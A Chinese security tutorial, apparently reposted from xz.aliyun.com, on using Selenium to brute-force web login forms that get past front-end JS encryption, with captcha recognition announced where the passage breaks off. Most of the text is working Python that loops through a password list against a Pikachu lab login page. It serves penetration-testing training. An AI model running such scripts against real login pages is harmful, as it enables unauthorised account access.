---
title: 利用Selenium绕过前端js加密及验证码爆破
url: https://buaq.net/go-134338.html
source: unSafe.sh - 不安全
date: 2022-11-06
fetch_date: 2025-10-03T21:49:17.124147
---

# 利用Selenium绕过前端js加密及验证码爆破

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/27d8bcd70cc921809cae32a339ad2c65.jpg)

利用Selenium绕过前端js加密及验证码爆破

Selenium可以模拟真实用户对URL中的元素进行操作。部分网站采用了一些流量校验算法，会将数据包中的进行加密，然后与计算出来的值进行比对，如果不能解密就加密的
*2022-11-5 21:35:0
Author: [xz.aliyun.com(查看原文)](/jump-134338.htm)
阅读量:57
收藏*

---

Selenium可以模拟真实用户对URL中的元素进行操作。部分网站采用了一些流量校验算法，会将数据包中的进行加密，然后与计算出来的值进行比对，如果不能解密就加密的算法就很难使用burp爆破，及修改数据包的功能，而使用Selenium可以模拟人操作网站的行为，用户输入URL打开网站，选中输入框，输入内容，点击登录框。如果目标网站开启了一些校验，这些也会自动经过校验处理。而burp是直接跳过了这些操作，直接向服务器发送数据包。

需要保证浏览器的大版本号，和浏览器的驱动程序匹配

* 下载Selenium[支持的浏览器](https://vikyd.github.io/download-chromium-history-version/#/)
* 下载Selenium[浏览器驱动程序](https://www.selenium.dev/documentation/webdriver/getting_started/install_drivers/)

## [安装Selenium py库](https://www.selenium.dev/documentation/webdriver/getting_started/install_library/)

`pip3 install selenium`

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015812-3fa14e0c-5c6a-1.png)

## 如何使用？

自己的默认浏览器的主版本号，需要与驱动的主版本号相同

经过上面的操作，下面需要测试python是否能够启动浏览器，能否加载浏览器驱动。

```
from selenium import webdriver

driver = webdriver.Chrome(executable_path=r'C:\WebDriver\bin\chromedriver.exe') #指定crome驱动位置

ActionChains(browser).key_down(Keys.CONTROL).send_keys("t").key_up(Keys.CONTROL).perform() #防止浏览器退出
```

执行后成功弹出浏览器。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015850-56a5d564-5c6a-1.png)

下面来了解一下Selenium的常见语法

## 常见语法

```
title = driver.title # 获取标题
driver.implicitly_wait(0.5) # 等待0.5秒

URL操作
driver.get() # 打开新网页
driver.refresh() # 刷新网页

查找元素
search_box = driver.find_element(by=By.NAME, value="q") # 通过NAME来寻找元素
search_button = driver.find_element(by=By.ID, value="btnK") # 通过ID来寻找元素
find_pass = driver.find_element(by=By.XPATH, value='//*[@id="app"]/div/div[1]/div[2]/div[1]/div/div[2]/input') # 通过XPATH的方式来寻找元素

操作元素
search_box.send_keys("Selenium")  # 输入内容
search_button.click()   # 点击按钮
SearchInput.clear() # 清除内容

获取元素信息
value = search_box.get_attribute("value")

结束会话
driver.quit()
```

## 大致流程

查找元素 -> 输入内容 -> 点击按钮 -> 获取返回的元素信息(判断是否登录成功)

## 打开网页

尝试让python程序打开一个网站。这里使用Pikachu的漏洞靶场来测试爆破功能

```
from selenium import webdriver

def main():

    driver = webdriver.Chrome(executable_path=r'C:\WebDriver\bin\chromedriver.exe') #指定crome驱动位置
    driver.get('http://192.168.180.152/06/vul/burteforce/bf_form.php')#打开指定URL

    ActionChains(browser).key_down(Keys.CONTROL).send_keys("t").key_up(Keys.CONTROL).perform()

if __name__ == "__main__":
    main()
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015906-60250254-5c6a-1.png)

## 元素选择

元素的选择支持ID，NAME，CSS，XPATH等方式，如果在一个DOM中出现两个相同名元素，默认会选择第一个元素。
这里推荐使用Xpath的方式寻找路径。

`find_login_box = driver.find_element(by=By.XPATH, value='')`

### 账户输入框

通过查看页面，首先确定账户输入框的位置

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015920-6847ea64-5c6a-1.png)

### 获取Xpath

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015930-6e8f22c0-5c6a-1.png)

### 选择登录框元素

`find_login_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')`

### 密码输入框

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105015949-79656ab0-5c6a-1.png)

`find_pass_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[2]/span/input')`

## 输入内容

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105020002-814dd096-5c6a-1.png)

```
find_login_box.send_keys('admin')
    find_pass_box.send_keys('password')
```

运行后会自动打开网址，然后寻找元素，输入内容

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105020014-888235d2-5c6a-1.png)

## 点击操作

### 元素选择

首先选定Login按钮元素

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105020023-8dd6c408-5c6a-1.png)

```
find_button = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/div[2]/label/input')
find_button.click()
```

运行python程序，会发现自动输入了账户密码，并点击了登录按钮。

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105020037-960c17a4-5c6a-1.png)

### 完整代码

```
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By

def main():

    driver = webdriver.Chrome(executable_path=r'C:\WebDriver\bin\chromedriver.exe') #指定crome驱动位置
    driver.get('http://192.168.180.152/06/vul/burteforce/bf_form.php')

    find_login_box = driver.find_element(by=By.XPATH,value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')
    find_pass_box = driver.find_element(by=By.XPATH,value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[2]/span/input')

    find_login_box.send_keys('admin')
    find_pass_box.send_keys('password')

    find_button = driver.find_element(by=By.XPATH,value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/div[2]/label/input')
    find_button.click()

    ActionChains(browser).key_down(Keys.CONTROL).send_keys("t").key_up(Keys.CONTROL).perform()

if __name__ == "__main__":
    main()
```

## 循环读取

接下来要实现的是循环读取字典中的账户密码，这里主要通过在寻找元素处建立循环。设置一个密码字典，让程序每次自动从python字典中取值。

### 打开文件

首先建立一个名为pass.txt的文档，其中放上一些密码‘

使用python读取文档

```
read_passwords = open('pass.txt', 'r', encoding="utf-8")
    read_passwords.seek(0)
```

### 建立循环

这里建立循环使其查找元素，输入密码字典中的密码，登录，不断循环

```
for password in read_passwords:
        find_login_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')
        find_pass_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[2]/span/input')
        find_button = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/div[2]/label/input')

        password = password.strip()
        find_login_box.send_keys('admin')
        find_pass_box.send_keys(password)
        sleep(1)
        find_button.click()
```

### 返回包判断

接下来需要对点击登录后，页面的响应进行判断，从而确定是否登录成功。

对是否登录成功，可以通过一些特定的标志，状态码，返回包，进行判断

```
loginYN = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/p').text

        if loginYN == "login success":
            print("爆破成功，密码为:"+ password)

        sleep(2)
```

运行后会自动进行输入，如果识别到特征会自动输出

![](https://xzfile.aliyuncs.com/media/upload/picture/20221105020051-9e545c82-5c6a-1.png)

### 完整代码

```
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By

def login():
    driver = webdriver.Chrome(executable_path=r'C:\WebDriver\bin\chromedriver.exe')

    driver.get("http://192.168.124.148/test/vul/burteforce/bf_form.php")

    passwords = open('pass.txt','r',encoding="utf-8")
    passwords.seek(0)
    for password in passwords:
        find_login_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[1]/span/input')
        find_pass_box = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/label[2]/span/input')
        find_button = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/form/div[2]/label/input')

        password = password.strip()
        find_login_box.send_keys('admin')
        find_pass_box.send_keys(password)
        sleep(1)
        find_button.click()

        loginYN = driver.find_element(by=By.XPATH, value='//*[@id="main-container"]/div[2]/div/div[2]/div/div/p').text
        if loginYN == "login success":
            print("爆破成功，密码为:"+ password)

        sleep(2)

    #ActionChains(browser).key_down(Keys.CONTROL).send_keys("t").key_up(Keys.CONTROL).perform()

login()
```

## 利用ddddorc识别验证码爆破

首先使用官方给的语句，来对验证码进行判断。

![](https://xzfile.aliyuncs.com/media/upload/p...